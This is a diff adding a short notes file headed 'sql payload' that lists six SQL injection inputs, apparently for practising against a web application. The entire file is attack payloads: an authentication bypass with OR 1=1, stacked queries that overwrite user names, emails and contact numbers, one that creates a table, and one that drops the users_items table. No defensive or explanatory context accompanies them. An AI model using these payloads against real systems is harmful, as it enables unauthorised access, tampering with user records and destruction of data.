@@ -1,0 +1,25 @@
+
+
+sql payload
+
+1.) INPUT -> a' OR 1=1 # 
+   
+
+2.) INPUT -> 1';UPDATE users SET name='monkey' #
+
+	     1';UPDATE users SET name='keerthana' where id=3 #
+    
+
+3.) INPUT -> a'; create table emp(empid varchar(2)); #
+    
+
+4.) INPUT -> a'; drop table users_items;
+
+5.) INPUT -> INPUT -> 1';UPDATE users SET email='steev@gmail.com' where id=1 #
+
+6.)INPUT -> 1';UPDATE users SET contacts='5654774' where id=1 #
+     
+
+
+
+
